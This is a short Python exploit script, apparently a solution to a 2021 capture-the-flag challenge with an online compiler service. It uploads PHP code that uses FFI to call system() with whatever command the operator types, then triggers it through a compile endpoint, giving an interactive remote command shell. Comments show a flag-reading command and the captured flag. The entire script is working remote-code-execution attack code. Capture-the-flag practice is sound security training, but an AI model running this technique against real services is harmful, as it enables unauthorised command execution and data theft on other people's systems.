import requests
from pwn import *

url = 'http://onlinecompiler.2021.3k.ctf.to:5000/'
path = ['save', 'compile']

# Reference : https://www.php.net/manual/en/ffi.examples-basic.php

while(1):
    command = raw_input("pocas@py : ")
    c_type, code = 'php', '<?php $ffi=FFI::cdef("int system(const char *command);");$ffi->system(\'{}\');?>'.format(command)
    body1 = {'c_type':c_type, 'code':code}

    # save
    filename = requests.post(url + path[0], data=body1).text
    log.info("Exploitation")
    log.info("filename : " + filename)

    # compile
    body2 = {'c_type':c_type, 'filename':filename}
    result = requests.post(url + path[1], data=body2).text.replace('\n', ' ')
    log.info("result : " + result)

# Input  : cat /El_FlAAG___FilEE
# Output : 3k{JuSt_A_WaRmUp_O.o}
